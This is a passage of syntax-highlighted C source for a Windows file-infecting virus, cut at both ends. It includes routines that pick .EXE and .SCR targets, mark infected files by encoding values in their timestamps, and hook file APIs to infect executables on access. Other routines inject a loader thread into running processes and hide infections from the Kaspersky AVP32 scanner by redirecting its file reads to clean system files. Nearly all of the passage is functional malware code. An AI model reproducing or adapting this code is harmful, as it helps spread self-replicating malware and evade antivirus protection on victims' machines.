        </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]!=</span><span class="sc7">'A'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">]!=</span><span class="sc7">'A'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">blen</span><span class="sc10">;</span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc7">'.'</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">--)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dext</span><span class="sc10">=*(</span><span class="sc16">int</span><span class="sc10">*)(&amp;</span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dext</span><span class="sc10">!=</span><span class="sc7">'.EXE'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">dext</span><span class="sc10">!=</span><span class="sc7">'.SCR'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//HLL coders &amp; little-endian?
</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">crc</span><span class="sc10">=</span><span class="sc11">crc32</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">c</span><span class="sc10">&lt;</span><span class="sc4">106</span><span class="sc10">;</span><span class="sc11">c</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">crc</span><span class="sc10">==((</span><span class="sc16">int</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)&amp;</span><span class="sc11">blacklist</span><span class="sc10">-</span><span class="sc4">0x401000</span><span class="sc10">))[</span><span class="sc11">c</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">


    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc1">/* returns 1 if infected, 2 if processed but not infected */</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">isspecialfiletime</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">FILETIME</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">filetime</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">systime</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">FileTimeToSystemTime</span><span class="sc10">(</span><span class="sc11">filetime</span><span class="sc10">,&amp;</span><span class="sc11">systime</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">//infected?
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wHour</span><span class="sc10">==(</span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">*</span><span class="sc4">16021019</span><span class="sc10">)%</span><span class="sc4">24</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc2">//1.602*10^-19
</span><span class="sc0">        </span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wMinute</span><span class="sc10">==(</span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">*</span><span class="sc4">911031</span><span class="sc10">)%</span><span class="sc4">60</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">//9.1*10^-31
</span><span class="sc0">        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">//processed?
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wHour</span><span class="sc10">==(</span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">*</span><span class="sc4">314159</span><span class="sc10">)%</span><span class="sc4">24</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
        </span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wMinute</span><span class="sc10">==(</span><span class="sc11">systime</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">*</span><span class="sc4">271828</span><span class="sc10">)%</span><span class="sc4">60</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">//pi &amp; e
</span><span class="sc0">        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* checks if filename is infected using findfirstfilew -&gt; time
   returns 1 if infected, 2 if processed but not infected */</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">isinfected</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">wfd</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">!=(</span><span class="sc11">h</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">FindFirstFileW</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">)))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">r</span><span class="sc10">=</span><span class="sc11">isspecialfiletime</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">.</span><span class="sc11">ftLastWriteTime</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc1">/* main hook handler. is called by assembler intercepter  */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">hookhandler</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">arg1</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hookn</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">**</span><span class="sc0"> </span><span class="sc11">arg1p</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">hookglob</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">hg</span><span class="sc10">=(</span><span class="sc11">hookglob</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+</span><span class="sc11">VIRTUALCODESIZE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">=(</span><span class="sc11">api</span><span class="sc10">*)&amp;</span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">a</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">arg1</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">tick</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">GetTickCount</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc2">//avoids api loop locks etc
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">inapi</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tick</span><span class="sc10">-</span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">inapi</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">666</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">//666ms max
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">inapi</span><span class="sc10">=</span><span class="sc11">tick</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc4">520</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc2">//wide
</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">lstrlenW</span><span class="sc10">(</span><span class="sc11">arg1</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">&lt;</span><span class="sc4">260</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">arg1</span><span class="sc10">,</span><span class="sc11">n</span><span class="sc10">*</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc2">//backup filename
</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">isinf</span><span class="sc10">=</span><span class="sc11">isinfected</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">arg1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//1 = infected, 2 = processed
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">isinf</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">isgoodname</span><span class="sc10">(</span><span class="sc11">base</span><span class="sc10">,</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">hookn</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">isinf</span><span class="sc10">=</span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">base</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">IsBadWritePtr</span><span class="sc10">((</span><span class="sc16">void</span><span class="sc10">*)</span><span class="sc11">arg1</span><span class="sc10">,</span><span class="sc11">n</span><span class="sc10">*</span><span class="sc4">2</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">arg1</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">n</span><span class="sc10">*</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc2">//restore filename if possible
</span><span class="sc0">
        </span><span class="sc2">//if hooking inside AVP32 then make it unable to access the real 
</span><span class="sc0">        </span><span class="sc2">//infected file
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">flags</span><span class="sc10">==</span><span class="sc11">STEALTH_AV</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">isinf</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">asm</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">*(</span><span class="sc16">int</span><span class="sc10">*)</span><span class="sc11">arg1p</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">getrndfile</span><span class="sc10">(</span><span class="sc11">hg</span><span class="sc10">,</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">avbuffer</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">inapi</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc1">/* picks one of the 1000's of files in the win\system directory. this routine
   is used for av stealth (createfilew by an av of an infected file is re-
   directed to a clean file in the win\system dir */</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">getrndfile</span><span class="sc10">(</span><span class="sc11">hookglob</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">hg</span><span class="sc10">,</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">GetSystemDirectoryW</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc4">260</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc10">*(</span><span class="sc16">int</span><span class="sc10">*)&amp;((</span><span class="sc16">short</span><span class="sc10">*)</span><span class="sc11">buf</span><span class="sc10">)[</span><span class="sc11">l</span><span class="sc10">]=</span><span class="sc4">0x2a005c</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//append wildcard
</span><span class="sc0">        </span><span class="sc10">((</span><span class="sc16">short</span><span class="sc10">*)</span><span class="sc11">buf</span><span class="sc10">)[</span><span class="sc11">l</span><span class="sc10">+</span><span class="sc4">2</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">wfd</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">FindFirstFileW</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">getrnd32</span><span class="sc10">(</span><span class="sc11">hg</span><span class="sc10">)%</span><span class="sc4">512</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;;</span><span class="sc11">s</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">FindNextFileW</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">&gt;=</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                    </span><span class="sc10">!(</span><span class="sc11">wfd</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc10">&amp;</span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                    </span><span class="sc11">isspecialfiletime</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">.</span><span class="sc11">ftLastWriteTime</span><span class="sc10">)!=</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">

                  </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">memcpy</span><span class="sc10">(&amp;((</span><span class="sc16">short</span><span class="sc10">*)</span><span class="sc11">buf</span><span class="sc10">)[</span><span class="sc11">l</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc11">wfd</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc2">//replace *
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">//then make the createfilew at least fail...
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc1">/* based on nothing then feeling, but appears to work fine :) */</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">getrnd32</span><span class="sc10">(</span><span class="sc11">hookglob</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">hg</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">rnd32seed</span><span class="sc10">+=</span><span class="sc4">160219</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">rnd32seed</span><span class="sc10">*=</span><span class="sc4">0x49d23711</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">rnd32seed</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc1">/* remote created thread. base = absolute base */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">winntloader</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">asm</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">__seh_set</span><span class="sc0">

    </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">k32base</span><span class="sc10">=(</span><span class="sc16">void</span><span class="sc10">*)</span><span class="sc11">getk32base</span><span class="sc10">();</span><span class="sc0">

    </span><span class="sc11">hookglob</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">hg</span><span class="sc10">=(</span><span class="sc11">hookglob</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+</span><span class="sc11">VIRTUALCODESIZE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">=(</span><span class="sc11">api</span><span class="sc10">*)&amp;</span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">a</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc19">import</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">k32base</span><span class="sc10">,(</span><span class="sc16">int</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)&amp;</span><span class="sc11">crcs</span><span class="sc10">-</span><span class="sc4">0x401000</span><span class="sc10">),(</span><span class="sc16">int</span><span class="sc10">*)</span><span class="sc11">a</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">hostbase</span><span class="sc10">=(</span><span class="sc16">void</span><span class="sc10">*)</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">GetModuleHandleA</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">//give the current process our marker
</span><span class="sc0">    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">oldprot</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">!=(</span><span class="sc11">oldprot</span><span class="sc10">=</span><span class="sc11">changeprot</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">hostbase</span><span class="sc10">,</span><span class="sc11">PAGE_READWRITE</span><span class="sc10">)))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">PE_HEADER</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">pe</span><span class="sc10">=(</span><span class="sc11">PE_HEADER</span><span class="sc10">*)(((</span><span class="sc11">MZ_HEADER</span><span class="sc10">*)</span><span class="sc11">hostbase</span><span class="sc10">)-&gt;</span><span class="sc11">mz_neptr</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">hostbase</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">pe</span><span class="sc10">-&gt;</span><span class="sc11">pe_datetime</span><span class="sc10">=</span><span class="sc11">TESTVALUECHANGEME</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">VirtualProtect</span><span class="sc10">(</span><span class="sc11">hostbase</span><span class="sc10">,</span><span class="sc4">4096</span><span class="sc10">,</span><span class="sc11">oldprot</span><span class="sc10">,&amp;</span><span class="sc11">oldprot</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">inapi</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">flags</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* check the name of the module where we reside in. if it is one of mr.
       kaspersky's creations, then do a kind of file stealth hack (and also
       mass infect!)
       or if it is acdsee, explorer, cmd, winrar or wincommander, then enable
       filesizestealth. they are stealth compatible and a have a 100% award.
       (winzip for example isn't, but there are rumors it's creators are
       working hard on it to solve the problem) */</span><span class="sc0">

    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">260</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">GetModuleFileNameA</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">CharUpperA</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">l</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">l</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">--)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]==</span><span class="sc7">'\\'</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">crc</span><span class="sc10">=</span><span class="sc11">crc32</span><span class="sc10">(&amp;</span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">crc</span><span class="sc10">==</span><span class="sc4">0x2a20ddb</span><span class="sc10">)</span><span class="sc0">    </span><span class="sc2">//AVP32.EXE
</span><span class="sc0">                </span><span class="sc10">{</span><span class="sc0">
